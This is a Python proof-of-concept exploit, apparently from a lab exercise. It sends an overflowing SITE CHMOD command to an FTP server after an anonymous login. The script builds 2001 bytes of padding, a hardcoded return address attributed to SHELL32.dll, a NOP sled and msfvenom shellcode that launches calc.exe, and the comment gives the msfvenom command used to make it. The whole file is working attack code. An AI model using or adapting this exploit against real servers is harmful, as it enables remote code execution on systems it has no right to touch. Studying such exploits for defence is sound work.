#!/usr/bin/env python


import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):

# shellcode with metasploit:
#       msfvenom -p windows/exec CMD=calc.exe -b'\x00\x0A\x0D' -f c
    try:
        ret = b"\xD7\x30\x6B\x7E" #SHELL32.dll
        buffer = b'\x90'*30 + buf
        buffer2 = b'\x41' * 2001 + ret + buffer + b'\x43'*(749-len(buffer))
        s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
        s.connect((target_machine, target_port))
        s.recv(1024)
        s.send(b'USER anonymous\r\n')
        s.recv(1024)
        s.send(b'PASS anonymous\r\n')
        s.recv(1024)
        s.send(b'SITE CHMOD' + buffer2 + b'\r\n')
        s.close()
    except:
      print("Connection Failed")